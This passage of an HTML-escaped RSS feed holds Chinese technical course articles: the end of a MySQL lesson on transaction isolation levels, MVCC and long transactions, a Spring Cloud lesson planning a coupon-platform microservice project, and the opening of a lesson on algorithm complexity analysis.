&lt;li>若隔离级别是&amp;quot;读提交&amp;quot;，则 V1 是 1，V2 的值是 2。事务 B 的更新在提交后才能被 A 看到。所以， V3 的值也是 2。&lt;/li>
&lt;li>若隔离级别是&amp;quot;可重复读&amp;quot;，则 V1、V2 是 1，V3 是 2。之所以 V2 还是 1，遵循的就是这个要求：事务在执行期间看到的数据前后必须是一致的。&lt;/li>
&lt;li>若隔离级别是&amp;quot;串行化&amp;quot;，则在事务 B 执行&amp;quot;将 1 改成 2&amp;quot;的时候，会被锁住。直到事务 A 提交后，事务 B 才可以继续执行。所以从 A 的角度看， V1、V2 值是 1，V3 的值是 2。&lt;/li>
&lt;/ul>
&lt;p>在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑结果为准。在&amp;quot;可重复读&amp;quot;隔离级别下，这个视图是在事务启动时创建的，整个事务存在期间都用这个视图。在&amp;quot;读提交&amp;quot;隔离级别下，这个视图是在每个 SQL 语句开始执行的时候创建的。这里需要注意的是，&amp;ldquo;读未提交&amp;quot;隔离级别下直接返回记录上的最新值，没有视图概念；而&amp;quot;串行化&amp;quot;隔离级别下直接用加锁的方式来避免并行访问。&lt;/p>
&lt;p>我们可以看到在不同的隔离级别下，数据库行为是有所不同的。Oracle 数据库的默认隔离级别其实就是&amp;quot;读提交&amp;rdquo;，因此对于一些从 Oracle 迁移到 MySQL 的应用，为保证数据库隔离级别的一致，你一定要记得将 MySQL 的隔离级别设置为&amp;quot;读提交&amp;quot;。&lt;/p>
&lt;p>配置的方式是，将启动参数 transaction-isolation 的值设置成 READ-COMMITTED。你可以用 show variables 来查看当前的值。&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; show variables like 'transaction_isolation';
+-----------------------+----------------+
| Variable_name | Value |
+-----------------------+----------------+
| transaction_isolation | READ-COMMITTED |
+-----------------------+----------------+
&lt;/code>&lt;/pre>
&lt;p>总结来说，存在即合理，哪个隔离级别都有它自己的使用场景，你要根据自己的业务情况来定。我想&lt;strong>你可能会问那什么时候需要&amp;quot;可重复读&amp;quot;的场景呢&lt;/strong>？我们来看一个数据校对逻辑的案例。&lt;/p>
&lt;p>假设你在管理一个个人银行账户表。一个表存了每个月月底的余额，一个表存了账单明细。这时候你要做数据校对，也就是判断上个月的余额和当前余额的差额，是否与本月的账单明细一致。你一定希望在校对过程中，即使有用户发生了一笔新的交易，也不影响你的校对结果。&lt;/p>
&lt;p>这时候使用&amp;quot;可重复读&amp;quot;隔离级别就很方便。事务启动时的视图可以认为是静态的，不受其他事务更新的影响。&lt;/p>
&lt;h1 id="事务隔离的实现">事务隔离的实现&lt;/h1>
&lt;p>理解了事务的隔离级别，我们再来看看事务隔离具体是怎么实现的。这里我们展开说明&amp;quot;可重复读&amp;quot;。&lt;/p>
&lt;p>在 MySQL 中，实际上每条记录在更新的时候都会同时记录一条回滚操作。记录上的最新值，通过回滚操作，都可以得到前一个状态的值。&lt;/p>
&lt;p>假设一个值从 1 被按顺序改成了 2、3、4，在回滚日志里面就会有类似下面的记录。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/d9/ee/d9c313809e5ac148fc39feff532f0fee.png" alt="">&lt;br>
当前值是 4，但是在查询这条记录的时候，不同时刻启动的事务会有不同的 read-view。如图中看到的，在视图 A、B、C 里面，这一个记录的值分别是 1、2、4，同一条记录在系统中可以存在多个版本，就是数据库的多版本并发控制（MVCC）。对于 read-view A，要得到 1，就必须将当前值依次执行图中所有的回滚操作得到。&lt;/p>
&lt;p>同时你会发现，即使现在有另外一个事务正在将 4 改成 5，这个事务跟 read-view A、B、C 对应的事务是不会冲突的。&lt;/p>
&lt;p>你一定会问，回滚日志总不能一直保留吧，什么时候删除呢？答案是，在不需要的时候才删除。也就是说，系统会判断，当没有事务再需要用到这些回滚日志时，回滚日志会被删除。&lt;/p>
&lt;p>什么时候才不需要了呢？就是当系统里没有比这个回滚日志更早的 read-view 的时候。&lt;/p>
&lt;p>基于上面的说明，我们来讨论一下为什么建议你尽量不要使用长事务。&lt;/p>
&lt;p>长事务意味着系统里面会存在很老的事务视图。由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占用存储空间。&lt;/p>
&lt;p>在 MySQL 5.5 及以前的版本，回滚日志是跟数据字典一起放在 ibdata 文件里的，即使长事务最终提交，回滚段被清理，文件也不会变小。我见过数据只有 20GB，而回滚段有 200GB 的库。最终只好为了清理回滚段，重建整个库。&lt;/p>
&lt;p>除了对回滚段的影响，长事务还占用锁资源，也可能拖垮整个库，这个我们会在后面讲锁的时候展开。&lt;/p>
&lt;h1 id="事务的启动方式">事务的启动方式&lt;/h1>
&lt;p>如前面所述，长事务有这些潜在风险，我当然是建议你尽量避免。其实很多时候业务开发同学并不是有意使用长事务，通常是由于误用所致。MySQL 的事务启动方式有以下几种：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>显式启动事务语句， begin 或 start transaction。配套的提交语句是 commit，回滚语句是 rollback。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>set autocommit=0，这个命令会将这个线程的自动提交关掉。意味着如果你只执行一个 select 语句，这个事务就启动了，而且并不会自动提交。这个事务持续存在直到你主动执行 commit 或 rollback 语句，或者断开连接。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>有些客户端连接框架会默认连接成功后先执行一个 set autocommit=0 的命令。这就导致接下来的查询都在事务中，如果是长连接，就导致了意外的长事务。&lt;/p>
&lt;p>因此，我会建议你总是使用 set autocommit=1, 通过显式语句的方式来启动事务。&lt;/p>
&lt;p>但是有的开发同学会纠结&amp;quot;多一次交互&amp;quot;的问题。对于一个需要频繁使用事务的业务，第二种方式每个事务在开始时都不需要主动执行一次 &amp;ldquo;begin&amp;rdquo;，减少了语句的交互次数。如果你也有这个顾虑，我建议你使用 commit work and chain 语法。&lt;/p>
&lt;p>在 autocommit 为 1 的情况下，用 begin 显式启动的事务，如果执行 commit 则提交事务。如果执行 commit work and chain，则是提交事务并自动启动下一个事务，这样也省去了再次执行 begin 语句的开销。同时带来的好处是从程序开发的角度明确地知道每个语句是否处于事务中。&lt;/p>
&lt;p>你可以在 information_schema 库的 innodb_trx 这个表中查询长事务，比如下面这个语句，用于查找持续时间超过 60s 的事务。&lt;/p>
&lt;pre>&lt;code>select * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))&amp;gt;60
&lt;/code>&lt;/pre>
&lt;h1 id="小结">小结&lt;/h1>
&lt;p>这篇文章里面，我介绍了 MySQL 的事务隔离级别的现象和实现，根据实现原理分析了长事务存在的风险，以及如何用正确的方式避免长事务。希望我举的例子能够帮助你理解事务，并更好地使用 MySQL 的事务特性。&lt;/p>
&lt;p>我给你留一个问题吧。你现在知道了系统里面应该避免长事务，如果你是业务开发负责人同时也是数据库负责人，你会有什么方案来避免出现或者处理这种情况呢？&lt;/p>
&lt;p>你可以把你的思考和观点写在留言区里，我会在下一篇文章的末尾和你讨论这个问题。感谢你的收听，也欢迎你把这篇文章分享给更多的朋友一起阅读。&lt;/p>
&lt;h1 id="上期问题时间">上期问题时间&lt;/h1>
&lt;p>在上期文章的最后，我给你留下的问题是一天一备跟一周一备的对比。&lt;/p>
&lt;p>好处是&amp;quot;最长恢复时间&amp;quot;更短。&lt;/p>
&lt;p>在一天一备的模式里，最坏情况下需要应用一天的 binlog。比如，你每天 0 点做一次全量备份，而要恢复出一个到昨天晚上 23 点的备份。&lt;/p>
&lt;p>一周一备最坏情况就要应用一周的 binlog 了。&lt;/p>
&lt;p>系统的对应指标就是 @尼古拉斯·赵四 @慕塔 提到的 RTO（恢复目标时间）。&lt;/p>
&lt;p>当然这个是有成本的，因为更频繁全量备份需要消耗更多存储空间，所以这个 RTO 是成本换来的，就需要你根据业务重要性来评估了。&lt;/p>
&lt;p>同时也感谢 @super blue cat、@高枕、@Jason 留下了高质量的评论。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ce/d9/ce7f4e35916ed1aa49206a53a0547bd9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨初窥门径：我们要搭建一个怎样的微服务实战项目</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/03%E4%B8%A8%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84%E6%88%91%E4%BB%AC%E8%A6%81%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%80%8E%E6%A0%B7%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/03%E4%B8%A8%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84%E6%88%91%E4%BB%AC%E8%A6%81%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%80%8E%E6%A0%B7%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/</guid><description>
&lt;p>你好，我是姚秋辰。&lt;/p>
&lt;p>在上一节课，我跟你介绍了 Spring Cloud 的发展背景以及各个组件库，此刻，你一定已经跃跃欲试想要立马开始动手编写实战项目了吧？别着急，今天咱先别忙着敲代码，让我先为你勾画出实战项目的全景蓝图。&lt;/p>
&lt;p>这节课，我会跟你聊一聊我们这个优惠券平台项目的整体功能和模块，以及每个功能点的技术选型和背后的依据，让你从宏观的角度来了解一下我们整个项目的概貌和大致的走向，帮助你更轻松地学习后面的课程。首先，我来带你了解一下这个实战项目的业务功能。&lt;/p>
&lt;h1 id="优惠券平台项目介绍">优惠券平台项目介绍&lt;/h1>
&lt;p>相信你一定参与过双 11 或者 618 之类的电商大促活动，体验过各种眼花缭乱的优惠券和营销规则计算。而我们的实战项目，就是要搭建一个简化版的营销优惠计算系统，实现优惠券模板的创建、用户领取优惠券、下单核销优惠券和订单价格试计算等功能。&lt;/p>
&lt;p>我曾经参与了一线电商新零售平台营销中心业务从 0 到 1 的搭建，与淘系营销优惠平台 UMP 对接过很多花式营销玩法。根据我过去的经验，如果我要实现一个&amp;quot;领取优惠券&amp;quot;的功能，那么我首先是要创建一个营销规则模板。这个模板就像是一个模具一样，每张优惠券都通过这个模具来铸造，并最终发放到用户手中。&lt;/p>
&lt;p>使用模板的好处是可以对优惠券消费规则做一层抽象，比如满减类、打折类这些优惠券只是具体的优惠金额不同，但是玩法类似，我们把相类似的玩法功能抽象成一个模板，就可以简化具体优惠券的创建和核销流程。&lt;/p>
&lt;p>在这个实战项目中，我也借鉴了之前的工作经验，把整个项目划分为了优惠券模板服务、计算服务、用户服务和平台类组件这四大模块。它们的功能是这样的：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>优惠券模板服务&lt;/strong>：模板规则是创建具体优惠券的前置条件，每种类型的模板都是一个计算公式，这个公式约定了优惠计算的方式。在这个项目中，模板服务实现了模板规则的创建、克隆、分页查找等功能。另外，我将在项目里定义满减、随机立减、满折、晚间双倍优惠等多种券模板类型。&lt;/li>
&lt;li>&lt;strong>优惠计算服务&lt;/strong>：这个模块是根据用户购物车中的商品信息（单价、数量、所属门店）和优惠券信息，来计算当前订单优惠后的价格。另外，如果用户有多张优惠券，我还提供了&amp;quot;优惠金额试算&amp;quot;服务，帮助用户挑选最省钱的优惠券。&lt;/li>
&lt;li>&lt;strong>用户服务&lt;/strong>：这是暴露给外部用户使用的接口，它依赖于模板服务和优惠计算服务完成底层逻辑，主要业务场景是用户领券、订单价格试算、下单核销和订单金额试算等功能。&lt;/li>
&lt;li>&lt;strong>平台类组件&lt;/strong>：主要包括一些业务无关的中心化组件，比如 Gateway 网关等等，你将在 Spring Cloud 课程中逐渐接触到平台类组件的搭建。&lt;/li>
&lt;/ul>
&lt;p>从整体来看，优惠券模板服务和优惠计算服务是基础服务，用户服务是对用户开放的接口，它依赖于这两个基础服务来完成业务逻辑。而平台类组件则提供了横向的微服务特性支持，比如微服务网关、链路追踪功能等等，你可以把它们理解为&amp;quot;微服务中间件&amp;quot;。我们通过下面这幅图来看一下这四个模块之间的关联关系：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/b0/01/b06e7ba06965b497f07285b571f8fa01.jpg?wh=2000x1039" alt="">&lt;/p>
&lt;p>我们在开篇词中提到，为了帮你顺利过渡到 Spring Cloud 实战，我会先用 Spring Boot 搭建出这个优惠券平台的单体应用，然后在这个基础上做 Spring Cloud 改造。&lt;/p>
&lt;h1 id="spring-boot-实战项目规划">Spring Boot 实战项目规划&lt;/h1>
&lt;p>从项目实施的角度来看，Spring Boot 阶段的任务相对简单。我们会用两节课搭建起优惠券平台的三个业务模块，并按照模块之间的先后依赖顺序进行改造。在第一节课中，我将带你搭建一个单体应用版的优惠券模板服务，在这个过程中我们会使用 spring-data-jpa 和 spring-web 实现系统搭建。其中，spring-data-jpa 是用来实现数据库 CRUD 操作的组件，而 spring-web 是开发 RESTFul 风格的 API 接口所需要用到的组件。接着在第二节课中，我们将使用同样的技术搭建订单优惠计算服务和用户服务。&lt;/p>
&lt;p>这里你要注意，在 Spring Boot 的阶段，用户服务是一个&amp;quot;超级单体应用&amp;quot;，我把优惠券模板服务和订单优惠计算服务都打包到了用户服务中，跨模块的服务调用都是通过本地方法完成的，因此你只用启动用户服务就可以执行所有模块的业务功能。&lt;/p>
&lt;p>在搭建项目的过程中，我会带你重点掌握以下这三个技术点：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>项目搭建&lt;/strong>：分层构建项目结构，并借助 Maven 实现依赖项管理；&lt;/li>
&lt;li>&lt;strong>数据操作&lt;/strong>：我会带你快速入门 spring-data-jpa 实战，分别通过接口声明、自定义 SQL 和 JpaRepository 三种方式实现数据库 CRUD 操作；&lt;/li>
&lt;li>&lt;strong>开放对外 API&lt;/strong>：快速入门 spring-web 实战，通过注解对外暴露 RESTful 风格的 API。&lt;/li>
&lt;/ul>
&lt;p>此外，我还会不断跟你分享一些我平时工作中积累的小技巧，比如防御型编程、如何借助插件自动生成代码和数据校验、JPA 级联关系的误区、计算密集型服务的特点、模板设计模式的应用等等，相信这些内容可以给你一些工作上的启发。&lt;/p>
&lt;p>Spring Boot 的官方社区提供了一个非常简单的 Hello World 教程，如果你没有太多 Spring Boot 的使用经验，那么可以通过这个教程链接Spring Quickstart Guide来了解 Spring Boot 的搭建过程。&lt;/p>
&lt;p>在 Spring Boot 阶段我们搭建好优惠券平台的单体应用后，接下来就可以进行 Spring Cloud 微服务化改造了。&lt;/p>
&lt;h1 id="spring-cloud-实战项目全景规划">Spring Cloud 实战项目全景规划&lt;/h1>
&lt;p>我们先来看一下优惠券平台采用微服务架构，整体的技术方案规划和技术选型是怎样的。下面这张图里列举的技术框架都是目前一线广泛使用的开源组件。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/65/a7/65a733f0e38c0a374bd1d0ecbf2d18a7.jpg?wh=2000x1039" alt="">&lt;/p>
&lt;p>看到图中的这些技术点，我想此刻的你一定很懵，不知道这些技术框架的用途，也不知道该从何处下手来做改造。那么，接下来让我跟你聊聊我如何设计 Spring Cloud 实战课程的技术选型以及总体的搭建流程，这样你就能做到心中有数，学起来也能得心应手了。&lt;/p>
&lt;p>根据微服务学习的路径以及各个组件的难易程度，我把整个微服务框架由浅入深分为了三个不同的阶段：&lt;/p>
&lt;p>第一阶段：搭建基础的微服务功能，实现&lt;strong>微服务之间的通信&lt;/strong>；&lt;/p>
&lt;p>第二阶段：为各个模块构建&lt;strong>服务容错&lt;/strong>、&lt;strong>分布式配置中心&lt;/strong>、&lt;strong>分布式链路追踪能力&lt;/strong>；&lt;/p>
&lt;p>第三阶段：进一步实现&lt;strong>微服务网关&lt;/strong>、&lt;strong>消息驱动&lt;/strong>和&lt;strong>分布式事务&lt;/strong>。&lt;/p>
&lt;p>下面我们来看下每个阶段主要做些什么以及对应的技术选型。&lt;/p>
&lt;h1 id="第一阶段">第一阶段&lt;/h1>
&lt;p>在第一阶段，我们主要实现&lt;strong>微服务之间的通信&lt;/strong>，将用户微服务、优惠券模板服务和订单优惠计算服务拆分为独立部署的业务系统，通过注册中心来实现服务注册和服务发现，让各个微服务之间可以互相调用。这个阶段涉及的关键技术是 Nacos 注册中心、Loadbalancer 客户端负载均衡组件和 OpenFeign 服务间调用组件。&lt;/p>
&lt;p>我们知道，微服务之间的服务通信有一个前提条件，就是你要知道将要调用的服务器地址是什么。这个寻址的任务是交由 Nacos 注册中心和 Loadbalancer 负载均衡器共同来完成的。&lt;/p>
&lt;p>Nacos 是 Alibaba 出品的服务治理组件，它作为一个注册中心组件，负责收集所有服务节点的地址信息并维护服务注册表，所有服务上线之后都会向它汇报状态。Loadbalancer 则承担了负载均衡的任务，在客户端发起服务调用的时候，它会负责从 Nacos 的注册表中挑选一台目标服务器。而 OpenFeign 组件是一个&amp;quot;锦上添花&amp;quot;的组件，它能够简化基于 HTTP 的远程服务调用，让我们就像使用本地接口一样方便地发起远程服务调用。&lt;/p>
&lt;p>为什么我会选择 Nacos+Loadbalancer 作为选型方案呢？其实，在早期版本的 Spring Cloud 微服务架构选型中，Eureka + Ribbon 是一个使用最为广泛的组合，它们是 Netflix 公司贡献给 Spring Cloud 项目的服务治理 + 负载均衡组件。&lt;/p>
&lt;p>我们在上节课中讲过，Netflix 正在退出 Spring Cloud 的历史舞台。Eureka 和 Ribbon 已经进入了维护状态。其中，Ribbon 更是在 Spring Cloud I 版之后，就从官方组件库中被移除了。这意味着 Eureka 和 Ribbon 已经进入了&amp;quot;暮年&amp;quot;，不会再有重大的功能更新，如果你在项目中使用 Netflix 组件库，那么在未来将无法享受 Spring Cloud 社区发布的新功能。&lt;/p>
&lt;p>因此，在考虑技术选型的时候，我选择了&lt;strong>后劲更足、功能更为强大&lt;/strong>的 Nacos 和 Spring Cloud 官方开源的 Loadbalancer 组件。大致来讲，在第一阶段，我会分为三个部分来带你搭建起微服务之间的通信：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>服务治理&lt;/strong>：服务治理的重点是搭建基础的跨服务调用功能。我会把用户服务、优惠计算服务和订单服务改造成可以独立启动的微服务，并借助 Nacos 的服务发现功能，通过 Webflux 组件中的 WebClient 实现基于 HTTP 的跨服务间的调用；&lt;/li>
&lt;li>&lt;strong>负载均衡&lt;/strong>：在这部分，我们将在服务治理的基础上，引入 Loadbalancer 组件为跨服务调用添加负载均衡的能力。除此之外，我会对 Loadbalancer 组件的扩展接口做自定义开发，实现一个金丝雀测试的负载均衡场景；&lt;/li>
&lt;li>&lt;strong>简化服务调用&lt;/strong>：我将使用 OpenFeign 组件对用户服务进行改造，将原先复杂的 WebClient 调用替换为简洁的 OpenFeign 调用。&lt;/li>
&lt;/ul>
&lt;h1 id="第二阶段">第二阶段&lt;/h1>
&lt;p>在第二阶段，我们的实战重点有三个：&lt;/p>
&lt;ul>
&lt;li>利用服务容错提高微服务架构的可用性；&lt;/li>
&lt;li>搭建全链路的分布式链路追踪能力；&lt;/li>
&lt;li>实现统一的配置管理和动态属性推送。&lt;/li>
&lt;/ul>
&lt;p>这个阶段涉及的技术组件是 Nacos Config、Sentinel、Sleuth+Zipkin+ELK。&lt;/p>
&lt;p>在微服务架构中，&lt;strong>服务容错&lt;/strong>是保障服务高可用的一个重要手段。在这个项目中，我们选择用 Sentinel 作为服务容错组件，它也是 Alibaba 贡献给 Spring Cloud 的。Sentinel 秉承了阿里系&amp;quot;大而全&amp;quot;的传统，只这一款组件就可以实现&lt;strong>降级&lt;/strong>、&lt;strong>熔断&lt;/strong>、&lt;strong>流量整形&lt;/strong>等多种服务容错途径。&lt;/p>
&lt;p>&lt;strong>链路追踪&lt;/strong>也是微服务架构中一个很重要的功能，线上异常排查全靠它提供线索。我使用了 Spring Cloud 官方开源的 Sleuth 实现了日志打标功能，使用全局唯一标记将一次跨微服务调用链上的各个环节全部串联起来。&lt;/p>
&lt;p>光打标还没用，我还结合了 Zipkin 组件实现&lt;strong>调用链的可视化检索&lt;/strong>，将调用链上各个阶段的请求按顺序显示在页面上，这样，我们就可以一目了然定位到线上异常发生在哪个环节。另外，我使用了目前业界主流的 ELK 组合（Elastic Search + Logstash + Kibana）作为日志检索系统。&lt;/p>
&lt;p>在&lt;strong>配置项管理&lt;/strong>的技术选型方面，我使用了 Nacos Config 作为最终方案。借助 Nacos Config 我们可以轻松实现配置项的远程获取和动态推送，在配置项的应用隔离和环境隔离方面 Nacos 也是一把好手，我将会在配置管理的实战环节讲述更多的配置项花式玩法。相比较 Spring Cloud 的另一款配置管理组件 Spring Cloud Config 来说，Nacos 的搭建更加容易且更易于上手，而且可以更好地支持&amp;quot;配置项&amp;quot;回滚的功能。&lt;/p>
&lt;p>在后面的课程中，我将按照下面的顺序来实现这些能力：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>配置管理&lt;/strong>：配置管理的重点是将三个微服务应用接入到 Nacos Config 配置中心，使用远程配置中心存储部分配置项。&lt;/li>
&lt;li>&lt;strong>服务容错&lt;/strong>：搭建 Sentinel Dashboard 控制台，通过控制台将降级规则和流量整形规则应用到业务埋点中。&lt;/li>
&lt;li>&lt;strong>链路追踪&lt;/strong>：这部分的重点是搭建分布式链路追踪与日志系统。&lt;/li>
&lt;/ul>
&lt;h1 id="第三阶段">第三阶段&lt;/h1>
&lt;p>在第三阶段，我们的实战重点有三个：&lt;/p>
&lt;ul>
&lt;li>搭建微服务网关作为统一流量入口；&lt;/li>
&lt;li>使用消息驱动组件对接 RabbitMQ；&lt;/li>
&lt;li>通过分布式事务保证数据一致性。&lt;/li>
&lt;/ul>
&lt;p>这个阶段涉及的技术组件是 Gateway、Stream 和 Seata。&lt;/p>
&lt;p>&lt;strong>微服务网关&lt;/strong>是架设在外部网关（如 Ngnix）和内部微服务之间的一座桥梁，我选用 Spring Cloud Gateway 作为网关组件。Gateway 不光担任了路由转发的重任，同时它提供了丰富的谓词组合实现复杂的路由判断逻辑。除此以外，你还可以在网关层定义拦截器，对来访请求执行一段特殊的业务逻辑。&lt;/p>
&lt;p>曾经微服务网关的头把交椅是 Netflix 贡献的 Zuul 组件，但 Zuul 2.0 的开源发布一拖再拖，且性能并未达到预期效果。Spring Cloud 官方迫不得已，还没等到 Zuul 2.0 发布，就自己发布了一款开源网关组件 Spring Cloud Gateway。基于这些原因，Gateway 当之无愧成为了网关层的不二选择。&lt;/p>
&lt;p>&lt;strong>消息队列和消息驱动&lt;/strong>是老牌技术了，它并不是微服务特有的功能，我之所以在课程中加入了消息驱动这个内容，主要有两个原因。一是我想让你了解 Spring Cloud 开源的消息驱动组件&amp;quot;Stream&amp;quot;，它可以大幅降低应用系统和消息组件之间的对接流程。二是消息组件在如今有非常丰富的使用场景，我希望将&amp;quot;&lt;strong>消息组件的应用场景&lt;/strong>&amp;ldquo;作为一个知识拓展点，帮助你开阔眼界。&lt;/p>
&lt;p>&lt;strong>分布式事务&lt;/strong>是微服务环境下保证事务一致性的终极手段。在课程中我将主要介绍两种比较有代表性的 Seata 分布式事务解决方案，一种是没有代码侵入的 Seata AT 方案，另一种是蚂蚁金服贡献的资源锁定 + 补偿型的 Seata TCC 方案。&lt;/p>
&lt;p>好，到这里，我们就完整了解了整个项目的全景规划，以及对应的技术选型。现在，我们来回顾一下这节课的重点内容。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>在整个项目中，我们先通过 Spring Boot 快速落地了优惠券平台的三个业务模块，然后，在 Spring Cloud 实战阶段，我们分为三个阶段对 Spring Boot 项目进行微服务化改造：&lt;/p>
&lt;ul>
&lt;li>第一个阶段使用 Nacos、Loadbalancer 和 OpenFeign 实现了跨服务的调用；&lt;/li>
&lt;li>第二阶段使用 Sentinel、Nacos Config 和 Sleuth 实现了服务容错、配置管理和分布式链路追踪；&lt;/li>
&lt;li>第三阶段使用 Gateway、Stream 和 Seata 实现了微服务网关、消息事件驱动和分布式事务。&lt;/li>
&lt;/ul>
&lt;p>在学习专栏的过程中，我不建议你&amp;quot;跳章节&amp;quot;学习，正确的姿势是顺着专栏的各个阶段稳步推进。因为每一个阶段的内容都有前后关系，后一个技术组件或多或少都依赖于前面课程中用到的组件，如果跳跃了几个章节，很容易漏掉一些关键步骤的配置和搭建过程，导致项目无法启动。&lt;/p>
&lt;p>学习过程中我们难免会碰到各种问题，需要求助于搜索引擎。你也许用得比较多的是国内的搜索引擎，但经常查到千篇一律的文章，又或者看一个解决方案还需要注册会员或者付费，体验相当不好。&lt;/p>
&lt;p>因此，我推荐你偶尔尝试使用 Google 和stackoverflow两个网站来查询解决方案。这两个网站是对我的工作最有帮助的两位老师，不仅能帮助你解决问题，还可以锻炼你的英文阅读能力。要知道英文能力对技术人员来说还是相当重要的，尤其是当你想要了解一些前沿技术或者阅读一些论文的时候。所以，提高英文阅读能力要靠你平时的不断积累才行。&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>最后，请你思考一下，还有哪些微服务的技术点是你想了解的，你可以在留言区提出感兴趣的技术，在后期我可以把呼声比较高的技术点通过加餐的形式分享给你，让我们这个课程能够持续更新和演进。我在留言区等你。&lt;/p>
&lt;p>好啦，这节课就结束啦。欢迎你把这节课分享给更多对 Spring Cloud 感兴趣的朋友。我是姚秋辰，我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 03丨复杂度分析（上）：如何分析、统计算法的执行效率和资源消耗？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/03%E4%B8%A8%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90%E4%B8%8A%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E7%BB%9F%E8%AE%A1%E7%AE%97%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E6%95%88%E7%8E%87%E5%92%8C%E8%B5%84%E6%BA%90%E6%B6%88%E8%80%97/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/03%E4%B8%A8%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90%E4%B8%8A%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E7%BB%9F%E8%AE%A1%E7%AE%97%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E6%95%88%E7%8E%87%E5%92%8C%E8%B5%84%E6%BA%90%E6%B6%88%E8%80%97/</guid><description>
&lt;p>我们都知道，数据结构和算法本身解决的是&amp;quot;快&amp;quot;和&amp;quot;省&amp;quot;的问题，即如何让代码运行得更快，如何让代码更省存储空间。所以，执行效率是算法一个非常重要的考量指标。那如何来衡量你编写的算法代码的执行效率呢？这里就要用到我们今天要讲的内容：时间、空间复杂度分析。&lt;/p>
&lt;p>其实，只要讲到数据结构与算法，就一定离不开时间、空间复杂度分析。而且，我个人认为，&lt;strong>复杂度分析是整个算法学习的精髓，只要掌握了它，数据结构和算法的内容基本上就掌握了一半&lt;/strong>。&lt;/p>
&lt;p>复杂度分析实在太重要了，因此我准备用两节内容来讲。希望你学完这个内容之后，无论在任何场景下，面对任何代码的复杂度分析，你都能做到&amp;quot;庖丁解牛&amp;quot;般游刃有余。&lt;/p>
&lt;h2 id="为什么需要复杂度分析">为什么需要复杂度分析？&lt;/h2>
&lt;p>你可能会有些疑惑，我把代码跑一遍，通过统计、监控，就能得到算法执行的时间和占用的内存大小。为什么还要做时间、空间复杂度分析呢？这种分析方法能比我实实在在跑一遍得到的数据更准确吗？&lt;/p>
&lt;p>首先，我可以肯定地说，你这种评估算法执行效率的方法是正确的。很多数据结构和算法书籍还给这种方法起了一个名字，叫&lt;strong>事后统计法&lt;/strong>。但是，这种统计方法有非常大的局限性。&lt;/p>
&lt;p>&lt;strong>1. 测试结果非常依赖测试环境&lt;/strong>&lt;/p>
&lt;p>测试环境中硬件的不同会对测试结果有很大的影响。比如，我们拿同样一段代码，分别用 Intel Core i9 处理器和 Intel Core i3 处理器来运行，不用说，i9 处理器要比 i3 处理器执行的速度快很多。还有，比如原本在这台机器上 a 代码执行的速度比 b 代码要快，等我们换到另一台机器上时，可能会有截然相反的结果。&lt;/p>
&lt;p>&lt;strong>2. 测试结果受数据规模的影响很大&lt;/strong>&lt;/p>
&lt;p>后面我们会讲排序算法，我们先拿它举个例子。对同一个排序算法，待排序数据的有序度不一样，排序的执行时间就会有很大的差别。极端情况下，如果数据已经是有序的，那排序算法不需要做任何操作，执行时间就会非常短。除此之外，如果测试数据规模太小，测试结果可能无法真实地反应算法的性能。比如，对于小规模的数据排序，插入排序可能反倒会比快速排序要快！&lt;/p>
&lt;p>所以，&lt;strong>我们需要一个不用具体的测试数据来测试，就可以粗略地估计算法的执行效率的方法&lt;/strong>。这就是我们今天要讲的时间、空间复杂度分析方法。&lt;/p>
&lt;h2 id="大-o-复杂度表示法">大 O 复杂度表示法&lt;/h2>
&lt;p>算法的执行效率，粗略地讲，就是算法代码执行的时间。但是，如何在不运行代码的情况下，用&amp;quot;肉眼&amp;quot;得到一段代码的执行时间呢？&lt;/p>
